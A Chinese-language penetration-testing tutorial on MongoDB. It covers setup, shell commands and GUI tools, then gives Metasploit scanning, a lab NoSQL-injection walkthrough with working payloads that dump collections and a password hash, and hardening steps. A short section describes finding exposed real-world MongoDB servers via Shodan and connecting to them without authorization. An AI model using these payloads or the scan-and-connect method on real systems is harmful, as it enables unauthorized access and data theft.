本篇文章是MongoDB数据库信息泄露漏洞复现，记录了实际中常见的MongoDB数据库未授权访问漏洞并如何使用，主要分为七个部分：MongoDB简介、MongoDB安装、MongoDB基本操作、MongoDB相关工具使用、MongoDB漏洞复现、MongoDB实战和MongoDB防御措施。

本篇文章由浅入深地介绍了MongoDB未配置访问认证授权导致的未授权访问漏洞。在学习MongoDB过程中也阅读了几十篇中英文MongoDB相关技术文章，最终按照作者我的思路进行总结，相关参考文章也在文末列出。

此外，文中可能会出现部分错误，望读者指出，谢谢。接着，开始我们的MongoDB数据库渗透学习！！

## 一、MongoDB基本介绍

MongoDB是一个高性能，开源，无模式的 **文档型数据库**
，是一个基于分布式文件存储的数据库，由C++编写。其中的数据以JSON格式文档的形式存储。MongoDB是一个介于关系数据库和非关系数据库之间的产品，是当前
NoSQL 数据库产品中最热门的一种。

> [NoSQL简介](https://www.runoob.com/mongodb/nosql.html)  
>
> [关系型数据库和非关系型数据库的区别](https://zhidao.baidu.com/question/1866521613307793907.html)

 **MongoDB默认端口号：**

27017：mongod和mongos实例的默认端口。

27018：设置--shardsvr运行变量或在配置文件里设置clusterRole为shardsvr时的默认端口

 **术语介绍：**

SQL术语/概念| MongoDB术语/概念| 解释/说明  
---|---|---  
database| database| 数据库  
table| collection| 数据库表/集合  
row| document| 数据记录行/文档  
column| field| 数据字段/域  
index| index| 索引  
  
Mongodb中每个数据库含有一个或多个集合collections（相当于table）

Mongodb中每个集合含有一个或多个文档document（相当于数据行）

文档Document是一组键值对，MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是
MongoDB 非常突出的特点。文档简单例子：

    
    
    {"username":"tom","password":"tom","email":"tom@gmail.com"}

 **MongoDB自带数据库：**

 **admin** ：
从权限的角度来看，这是"root"数据库。要是将一个用户添加到这个数据库，这个用户自动继承所有数据库的权限。一些特定的服务器端命令也只能从这个数据库运行，比如列出所有的数据库或者关闭服务器。

 **local:** 这个数据永远不会被复制，可以用来存储限于本地单台服务器的任意集合

 **config** : 当Mongo用于分片设置时，config数据库在内部使用，用于保存分片的相关信息。

 **漏洞成因：**

MongoDB **未配置访问认证授权**
，无需认证连接数据库后对数据库进行任意操作（未授权访问漏洞），存在严重的数据泄露风险。默认情况下MongoDB安装后，没有账号密码且未开启权限验证。但不同版本的监听地址不同，3.0之前版本默认监听在0.0.0.0，3.0及之后版本默认监听在127.0.0.1。

## 二、软件安装及环境搭建

### 1、MongoDB安装

MongoDB官网提供了32位、64位的预编译二进制包。选择最新版下载msi即可（截止到写这篇文章的时间，最新版本为4.4.5）

MongoDB下载地址：<https://www.mongodb.com/try/download/community>

![cWYg91.png](https://image.3001.net/images/20210618/1623992344_60cc281849eb560e3031b.png!small)

下载好后，拖进虚拟机，双击安装

 **1）选择安装类型**

选择`Custom`自定义安装

![2vyPY9.png](https://image.3001.net/images/20210618/1623992349_60cc281d43a1344a09181.png!small)

 **2）修改MongoDB安装路径**

![2vyiWR.png](https://image.3001.net/images/20210618/1623992357_60cc2825da25b48272946.png!small)

 **3）服务配置**

这里默认即可，Data Directory和Log Directory分别存放数据及日志文件信息

![2vyCFJ.png](https://image.3001.net/images/20210618/1623992368_60cc28305787bd2870523.png!small)

 **4）不勾选MongoDB Compass**

在默认的安装下，该文件会自动安装。也可以不勾选`install MongoDB compass`，到官网上去安装。这里留到后面单独装。

![2vypo4.png](https://image.3001.net/images/20210618/1623992375_60cc28370376950724e10.png!small)

等待片刻即可安装完成，遇到提示选择第一个即可。

![2vySwF.png](https://image.3001.net/images/20210618/1623992379_60cc283bc4efa7b250d3b.png!small)

### 2、MongoDB配置

#### bin目录结构

![2vyNTg.png](https://image.3001.net/images/20210618/1623992383_60cc283ff0d85381e90d0.png!small)

`mongod.cfg`文件为Windows里的配置文件，在Linux中名字为`mongod.conf`

#### 设置允许远程连接

在`mongod.cfg`文件中将`bindIP`地址修改为`0.0.0.0`，这样外部`IP`可以连接`MongoDB`，便于测试

    
    
    # network interfaces  
    net:  
    port: 27017  
    bindIp: 0.0.0.0

![2vyakQ.png](https://image.3001.net/images/20210618/1623992389_60cc28451790b608aba3b.png!small)

#### 配置环境变量

将`bin`目录配置进环境变量`C:\MongoDB\bin`

![cWYnpt.png](https://image.3001.net/images/20210618/1623992402_60cc2852e65d752d5ed54.png!small)

测试是否配置成功，在cmd下直接输入mongo即可判断

![cWYefI.png](https://image.3001.net/images/20210618/1623992481_60cc28a1a0e604e4254f0.png!small)

#### 配置文件启动

目的：将`mongodb`服务安装到`Windows`服务中，可以通过net命令进行开启和关闭

首先在`C:\MongoDB`目录下创建一个`mongodb.conf`文件（这个文件名和文件的路径随意，只要在mongodb目录下就行）

编辑该文件，配置相关信息，修改部分即可

    
    
    #数据库路径  
    dbpath=c:\MongoDB\data\  
    #日志输出文件路径  
    logpath=c:\MongoDB\log\mongodb.log  
    #错误日志采用追加模式，配置这个选项后mongodb的日志会追加到现有的日志文件，而不是从新创建一个新文件  
    logappend=true  
    #启用日志文件，默认启用  
    journal=true  
    #这个选项可以过滤掉一些无用的日志信息，若需要调试使用请设置为false  
    quiet=false  
    #端口号 默认为27017  
    port=27017

然后在cmd中输入下面命令，命名该服务名为`mongodb`

    
    
    mongod --config c:\MongoDB\mongodb.conf --install --serviceName "mongodb"

 **验证是否配置成功**

    
    
    net stop mongodb  
    net start mongodb

> 参考下文第四点：
> [Windows下图文详解Mongodb安装及配置](https://www.cnblogs.com/wjaaron/p/7800490.html)

### 3、Kali 下MongoDB安装

 **1）导入MongoDB密钥**

    
    
    wget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add -
 **2）创建文件**

    
    
    echo "deb http://repo.mongodb.org/apt/debian buster/mongodb-org/4.4 main" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list

 **3）更新软件包数据库**

    
    
    sudo apt-get update

 **4）安装MongoDB软件包**

    
    
    sudo apt-get install -y mongodb-org

### 4、Kali MongoDB服务配置

 **1）启动MongoDB服务**

    
    
    sudo systemctl start mongod  
    #查看端口信息  
    netstat -ntulp

![cWY9l6.png](https://image.3001.net/images/20210618/1623992486_60cc28a6107e329f2ad37.png!small)

 **2）检查服务状态**

    
    
    systemctl status mongod

![cWYPOO.png](https://image.3001.net/images/20210618/1623992491_60cc28aba787ad269fd40.png!small)

 **3）停止MongoDB服务**

    
    
    systemctl stop mongod

 **4）重启MongoDB服务**

    
    
    systemctl restart mongod

 **5）设置允许远程连接** 可在远程访问该库信息

    
    
    sudo vi /etc/mongod.conf  
    ​  
    # 修改bindIP为0.0.0.0  
    ​  
    # network interfaces  
    net:  
    port: 27017  
    bindIp: 0.0.0.0

![cWtJbD.png](https://image.3001.net/images/20210618/1623992495_60cc28afd15f0b2b5ea60.png!small)

 **6）Kali 卸载MongoDB**

删除软件包：

    
    
    sudo apt-get purge mongodb-org*

可以通过下面命令来查看这些软件包文件，也可以检测是否删除完成

    
    
    locate monodb-org

删除数据目录：

    
    
    sudo rm -r /var/log/mongodb  
    sudo rm -r /var/lib/mongodb

  

## 三、MongoDB基本操作

### 1、简单概念

`MongoDB Shell`是`MongoDB`自带的交互式`Javascript
shell`，用于对`MongoDB`进行操作和管理的交互式环境。进入到`MongoDB
shell`后，直接在命令行窗口下输入`mongo`即可（前提是配置了环境变量），进入后默认连接到test（数据库）。由于自带交互式`Javascript
shell`，可以直接在Mongo shell里进行一些简单的计算操作。

    
    
    > 1+1  
    2  
    > 0x10+0x10  
    32

### 2、基本命令

 **1）查看数据库列表**

    
    
    show dbs

![2vyWtJ.png](https://image.3001.net/images/20210618/1623992503_60cc28b7056e0ed22f2b6.png!small)

 **2）查看当前数据库**

默认登陆后，当前数据库为test

    
    
    db

![2vyRk4.png](https://image.3001.net/images/20210618/1623992528_60cc28d078180387dea7e.png!small)

 **3）创建数据库**

    
    
    use xiguadb

![2vyg7F.png](https://image.3001.net/images/20210618/1623992537_60cc28d99cd822ecbe0e6.png!small)

这里创建的xiguadb数据库并没有显示在dbs中，需要在xiguadb数据库中添加文档即可

 **4）插入数据**

    
    
    db.xiguadb.insert({"name":"john"})

![2vyc0U.png](https://image.3001.net/images/20210618/1623992544_60cc28e0a7a3da3fe773a.png!small)

插入文档后，dbs中显示了xiguadb数据库 注：这里文档是插入到名为xiguadb的集合中（自动创建的集合）

 **5）查看集合列表**

当前数据库下的所有集合列表

    
    
    show collections  
    show tables

![2vyBpn.png](https://image.3001.net/images/20210618/1623992549_60cc28e5b2b0ce6ce2b58.png!small)

在 MongoDB 中，不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合，一般同数据库名。

 **6）创建集合**

    
    
    db.createCollection("lanmei")

![2vyDlq.png](https://image.3001.net/images/20210618/1623992555_60cc28eb87be73762ff90.png!small)

 **7）条件查询**

先插入几条文档，在进行条件查询，pretty() 方法以格式化的方式来显示所有文档

    
    
    db.lanmei.insert({"str":"kkk","id":"001"})  
    db.lanmei.insert({"num":"1234567","id":"002"})  
    ​  
    db.lanmei.find({"num":"1234567"}).pretty()

![2vy6mT.png](https://image.3001.net/images/20210618/1623992560_60cc28f04755622307ef2.png!small)

文档插入后会自动添加一个`_id`属性，为唯一标识符

 **8）删除文档**

    
    
    db.lanmei.remove({"str":"kkk"})

![2vysXV.png](https://image.3001.net/images/20210618/1623992571_60cc28fb3cac0efad6ce6.png!small)

删除键值对为str和kkk的文档

 **9）删除集合**

    
    
    db.lanmei.drop()

![2vyr60.png](https://image.3001.net/images/20210618/1623992577_60cc29012d592ea5b446e.png!small)

 **10）删除数据库**

删除目前使用的数据库

    
    
    db.dropDatabase()

![2vyfh9.png](https://image.3001.net/images/20210618/1623992581_60cc2905ddb6f70417e94.png!small)

 **11）用户登陆**

    
    
    mongo --host 192.168.112.177 --port 27017 -u "mgtest" -p "123.com" --authenticationDatabase "admin"  
    或者  
    mongo -u mgtest -p 123.com localhost:27017/admin

## 四、MongoDB工具使用

### 1、MongoDB Compass安装

> `MongoDB compass`为`MongoDB`可视化工具，用于运维（可装可不装）

 **1）MongoDB Compass下载**

在默认的安装下，该文件会自动安装。也可以不勾选`install MongoDB compass`，到官网上去安装
下载链接：<https://www.mongodb.com/download-center/compass>

![2v61N4.png](https://image.3001.net/images/20210618/1623992588_60cc290c2b18cdcc451ff.png!small)

选择最新版下载文件即可（zip、msi均可）

 **2）MongoDB Compass msi文件安装**

![2v6KBT.png](https://image.3001.net/images/20210618/1623992599_60cc29171ff2bd6241c33.png!small)

 **3）MongoDB Compass使用**

启动进入程序后，点击Connect连接本地数据库

![2v6lEF.png](https://image.3001.net/images/20210618/1623992727_60cc29977c18e4db6b8c2.png!small)

连接成功，可以看到本地MongoDB数据库信息

![2v6MHU.png](https://image.3001.net/images/20210618/1623992759_60cc29b759bdc0ca7db6f.png!small)

MongoDB Compass作为官方的一款可视化管理工具，使用体验还是挺不戳的

### 2、Robo 3T工具

Robo 3T是一款免费、开源的MongoDB可视化管理工具。其前身为Robomongo，后被3T Software Labs收购更名为Robo 3T。

下载地址：<https://robomongo.org/>蓝奏云下载：<https://wwe.lanzoui.com/iV7hXo5baej>

![2v6hVS.png](https://image.3001.net/images/20210618/1623992767_60cc29bf62b42eabe7a9c.png!small)

 **1）安装Robo 3T**

下载好后，点击启动安装，默认下一步即可

![2v6Wb8.png](https://image.3001.net/images/20210618/1623992779_60cc29cbc18d18d450120.png!small)

 **2）启动Robo 3T，连接数据库**

启动Robo 3T程序，在连接界面选择左上角的Create选项，地址填本地地址及端口，连接进入

![2v6sCd.png](https://image.3001.net/images/20210618/1623992788_60cc29d4dbad5eb072da5.png!small)

 **3）查询数据库内容**

这里以上面的演示的xiguadb数据库和lanmei集合为例。下图可以看到MongoDB数据库信息结构

    
    
    db.lanmei.insert({"str":"kkk","id":"001"})  
    db.lanmei.insert({"num":"1234567","id":"002"})

![2v6cvt.png](https://image.3001.net/images/20210618/1623992802_60cc29e292145c77e68a8.png!small)

在查询窗口中输入命令进行查询操作，可自行上手体验。

### 3、Navicat_MongoDB工具

Navicat for MongoDB 提供高效图形化界面，用于MongoDB 数据库的管理、开发和监控。它能连接本地或远程的 MongoDB服务器。

中文下载地址：<http://www.navicat.com.cn/products/navicat-for-mongodb>英文下载地址：<https://navicat.com/en/products/navicat-for-mongodb>

下载好安装程序后，默认下一步安装

![2v6RDf.png](https://image.3001.net/images/20210618/1623992822_60cc29f6c4136c1a9a58a.png!small)

安装路径默认

![2v62KP.png](https://image.3001.net/images/20210618/1623992831_60cc29ff36326ae4d78eb.png!small)

进入主页面后，选择连接，选择`MongoDB`，填连接名`mongo`（这个名是随意填的）

![2v6y8A.png](https://image.3001.net/images/20210618/1623992836_60cc2a04d27adcf48681e.png!small)

之后操作轻松上手

  

### 4、NoSQLMap工具

NoSQLMap是一款免费、开源的基于python2的脚本工具，用于审计和自动注入攻击，并利用 NoSQL 数据库和 Web 应用程序中的默认配置弱点，使用
NoSQL 来披露或克隆数据库中的数据。是市面上为数不多的支持MongoDB数据库SQL注入的工具。

项目地址：<https://github.com/codingo/NoSQLMap>

 **1）安装**

    
    
    python setup.py install

![2vc92R.png](https://image.3001.net/images/20210618/1623992845_60cc2a0d3c524979b4e03.png!small)

 **2）开启该工具**

    
    
    python nosqlmap.py

![2v6jVU.png](https://image.3001.net/images/20210618/1623992852_60cc2a1433e0f2d980d48.png!small)

1-设置选项 2-NoSQL数据库访问攻击 3-NoSQL Web应用程序攻击 4-扫描匿名MongoDB访问 5-Change平台(目前:MongoDB)
x-Exit

 **3）简单使用**

选择1-设置选项

    
    
    1-设置目标主机/IP(当前:未设置)  
    2-设置web应用端口(当前为80)  
    3-设置App路径(当前:未设置)  
    4-切换为HTTPS(当前关闭)  
    5-设置MongoDB端口(当前:27017)  
    6-设置HTTP请求方式(GET/POST) (Current: GET)  
    7-设置MongoDB/Shell本地IP(当前:未设置)  
    8-设置shell监听端口(当前:未设置)  
    9-设置详细模式(Current: OFF)  
    0-载入选项文件  
    a-从保存的Burp请求载入选项  
    b-保存选项文件  
    h-设置请求头  
    x-返回主菜单

![2v6vaF.png](https://image.3001.net/images/20210618/1623992857_60cc2a1960e0b7f2a8120.png!small)

这里以上面的mozhe靶场做演示，靶场地址为：<http://219.153.49.228:49818/new_list.php?id=1>

![2v6x54.png](https://image.3001.net/images/20210618/1623992863_60cc2a1f6853272430d80.png!small)

填完相关配置项后，x返回主菜单，选择3NoSQL Web应用攻击

![2vcSPJ.png](https://image.3001.net/images/20210618/1623992869_60cc2a258993916ffa8fc.png!small)

跑完一圈下来，注入全部失败。。

![2vcpG9.png](https://image.3001.net/images/20210618/1623992875_60cc2a2b548936c59482a.png!small)

上手体验极差，毕竟这个脚本上次更新已经好久了，这款脚本比较鸡肋，还是手动注入行。

  

## 五、MongoDB漏洞复现

MongoDB在3版本以后并未出现RCE漏洞，一般的MongoDB漏洞基本上都是信息泄露之类的，所以要RCE还要和其余漏洞进行配合，下面介绍的漏洞也基本上是关于信息泄露的。

### 1、MSF渗透MongoDB

> 信息泄露

#### 0x01 简介

MSF中提供了一些用于渗透测试的脚本，输入下面命令查看和mongodb相关的渗透脚本。可以看到MSF中并没有很多关于MongoDB的脚本，唯一一个exploit也是对应2.x版本的MongoDB，现在基本没啥用，图中最有用的就属mongodb_login脚本了，它是一个扫描脚本，用于扫描目标主机是否开启MongoDB服务的27017端口及是否存在未授权访问漏洞

    
    
    search mongodb

![2vcazn.png](https://image.3001.net/images/20210618/1623992882_60cc2a32aa8a07597e33b.png!small)

#### 0x02 脚本使用

以Win 2016上的MongoDB测试，其IP地址为：192.168.112.176，使用脚本mongodb_login，查看选项。

![2vcwMq.png](https://image.3001.net/images/20210618/1623992897_60cc2a4185e03049a72df.png!small)

这个脚本一般就可以用于批量扫描MongoDB服务及未授权访问漏洞，可以进一步结合上面提及到的GUI管理工具（Compass、Robo
3T、Navicat）登陆进MongoDB查看到数据库信息造成信息泄露。

  

### 2、MongoDB数据库SQL注入漏洞

> 信息泄露

#### 0x01 简介

复现地址：<https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe>

SQL手工注入漏洞测试(MongoDB数据库)，手工进行SQL注入测试，获取管理密码登录。

背景介绍：安全工程师"墨者"最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MongoDB，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。

附上源代码截图:

![2vc0s0.png](https://image.3001.net/images/20210618/1623992950_60cc2a76d8057a65e4ca9.png!small)

#### 0x02 渗透过程

 **1）页面信息**

进去靶场后，发现一个通知页面，在地址栏可以看到id参数，很有可能是注入点

![2vcURs.png](https://image.3001.net/images/20210618/1623992970_60cc2a8a7123f0c72b111.png!small)

 **2）引号简单测试**

在最后面添加单引号进行测试，页面发生了变化，说明存在SQL注入漏洞

    
    
    id=1%27

![2vcNGj.png](https://image.3001.net/images/20210618/1623992976_60cc2a90b4f9526ad6290.png!small)

 **3）简单分析页面源代码**

源代码重要部分：

    
    
    # 查询语句，这里id值可控且没有经过过滤和限制  
    $query = "var data = db.notice.findOne({'id':'$id'}); return data;";  
    ​  
    #打印出数据库中title字段和content字段信息  
    <?php echo $obj['retval']['title'] ?>  
    <?php echo $obj['retval']['content'] ?>

4）构造链接测试

    
    
    id=1'}); return ({title:1,content:'test

![2vcqWd.png](https://image.3001.net/images/20210618/1623992979_60cc2a93e5ed93e245600.png!small)

 **4）爆库名**

    
    
    id=1'}); return ({title:tojson(db),content:'test  
    查询当前库名  
    db返回的是一个数组，回显为array，使用tojson()方法将其转为字符串类型

![2vcbJH.png](https://image.3001.net/images/20210618/1623992986_60cc2a9a156c5a334e409.png!small)

 **5）爆表名**

查询当前库的所有集合

    
    
    id=1'}); return ({title:tojson(db.getCollectionNames()),content:'test  
    getCollectionNames()以数组形式返回所有集合，需要使用tojson()方法转字符串格式

![2vcodO.png](https://image.3001.net/images/20210618/1623992996_60cc2aa4bd9a27947a210.png!small)

直接查询第1个集合名

    
    
    id=1'}); return ({title:db.getCollectionNames()[0],content:'test

![2vcIeK.png](https://image.3001.net/images/20210618/1623993001_60cc2aa9d10b0d4013d5f.png!small)

 **6）爆字段信息**

可以爆出用户名和密码信息

    
    
    id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'test

![2vcHFe.png](https://image.3001.net/images/20210618/1623993006_60cc2aae58f88f4bb556e.png!small)

 **7）MD5解密**

    
    
    MD5加密：a83cd5ad5ed3e1c5597441aaab289f5c  
    解密后 dsansda

![2vc4L6.png](https://image.3001.net/images/20210618/1623993010_60cc2ab2ee50f4c4f2bad.png!small)

 **8）远程登陆**

    
    
    Linux:  
    mongo --host 219.153.49.228 -u "mozhe" --authenticationDatabase "mozhe" -p'dsansda'

使用Robo 3T

![2vcToD.png](https://image.3001.net/images/20210618/1623993020_60cc2abcaa9b9b9e197f8.png!small)

填入登陆用户及密码

![2vcOSA.png](https://image.3001.net/images/20210618/1623993027_60cc2ac339bb7f8e2e079.png!small)

登陆后获取Key即可，不过这里始终登不进去，该IP连接不到，这个应该是靶场的问题。

  

## 六、MongoDB实战

> 这部分主要是在网络搜索到一些存在未授权访问漏洞的MongoDB服务，查看到其数据，这部分较敏感，大致演示下即可

 **1）前往shodan、fofa等网络空间搜索引擎**

输入关键字product:"MongoDB"进行搜索

![2v2mjI.png](https://image.3001.net/images/20210618/1623993051_60cc2adb66357dbcd0ad9.png!small)

 **2）随便看是否存在未授权访问漏洞**

在MSF中进行扫描检测（国外的站）

![2v2egA.png](https://image.3001.net/images/20210618/1623993086_60cc2afe8aec59fb9fa61.png!small)

 **3）Robo 3T连接未授权访问**

![2v2Z3d.png](https://image.3001.net/images/20210618/1623993091_60cc2b038ad87f10ded77.png!small)

经过多次测试，可以发现目前大部分暴露在网络上的存在未授权访问漏洞MongoDB服务都已经被"上锁"了，对于提升MongoDB的安全性，还需要一些防御措施

  

## 七、MongoDB防御措施

### 1、修改监听地址

在mongod.cfg文件中将监听IP地址改为指定IP或者本地IP（Linux下为mongod.conf文件）

    
    
    # network interfaces  
    net:  
    port: 27017  
    bindIp: 127.0.0.1

### 2、启动基于角色的登录认证功能

MongoDB支持SCRAM、x.509证书认证等多种认证机制，SCRAM（Salted Challenge Response Authentication
Mechanism）是3.x版本的默认认证机制，该机制通过用户名、密码验证，基于用户角色进行访问控制。

 **1）创建系统用户管理员**

    
    
    # 切换至admin数据库下  
    use admin  
    # 创建mgtest用户，密码为123.con  
    db.createUser(  
    {  
    user: "mgtest",  
    pwd: "123.com",  
    roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]  
    }  
    )  
    ​  
    # userAdminAnyDatabase: 赋予所有数据库的useradmin权限

![2v2OqP.png](https://image.3001.net/images/20210618/1623993098_60cc2b0a8207080d8180b.png!small)

 **2）在配置文件开启访问认证**

对匿名登陆的用户进行权限限制，需要进行认证

    
    
    vi /etc/mongod.conf  
    ​  
    security:  
    authorization: enabled

![2v2va8.png](https://image.3001.net/images/20210618/1623993104_60cc2b10721618c15fb70.png!small)

重启MongoDB服务

 **3）系统用户登录**

    
    
    mongo --port 27017 -u "mgtest" -p "123.com" --authenticationDatabase "admin"  
    或者  
    mongo -u mgtest -p 123.com localhost:27017/admin

![2v2Wb6.png](https://image.3001.net/images/20210618/1623993110_60cc2b16720ba24f547b1.png!small)

远程登陆

    
    
    mongo --host 192.168.112.177 --port 27017 -u "mgtest" -p "123.com" --authenticationDatabase "admin"

![2v2RDx.png](https://image.3001.net/images/20210618/1623993114_60cc2b1ae6c9585e75e43.png!small)

 **4）安全性验证**

如果这里以普通用户直接登陆，可以登陆进，但是没有权限。

![2v2Lrt.png](https://image.3001.net/images/20210618/1623993123_60cc2b2365391a603a6a1.png!small)

使用MSF的mongodb_login模块也扫描不到该主机存在未授权访问漏洞

![2v2HxA.png](https://image.3001.net/images/20210618/1623993134_60cc2b2eb7fa250a1d281.png!small)

 **5）通过db.auth()方法认证**

也在连接MongoDB时匿名登陆，连接成功后通过db.auth()方法进行认证

    
    
    use admin  
    db.auth("mgtest","123.com")

![2v2T8H.png](https://image.3001.net/images/20210618/1623993144_60cc2b38957e8cadec8b3.png!small)

  

## 八、总结

本文介绍了MongoDB的使用、MongoDB注入、未授权访问漏洞及防御措施，在MongoDB3.0以后的版本基本上就只存在未授权访问漏洞一种，并未RCE漏洞，也就是只存在信息泄露的可能，并不像其他数据库可以直接拿shell，在这方面MongoDB的安全性还是偏高的。

## 九、参考

MongoDB官方文档：  
[https://docs.mongodb.com/manual/security/﻿](https://docs.mongodb.com/manual/security/)

MongoDB操作&&注入漏洞&&未授权访问漏洞（安恒）
<https://cloud.tencent.com/developer/article/1515289>

MongoDB未授权访问漏洞分析及整改建议  
<https://www.freebuf.com/vuls/212799.html>

MongoDB注入  
<https://xi4or0uji.github.io/2019/02/27/MongoDB%E6%B3%A8%E5%85%A5/>

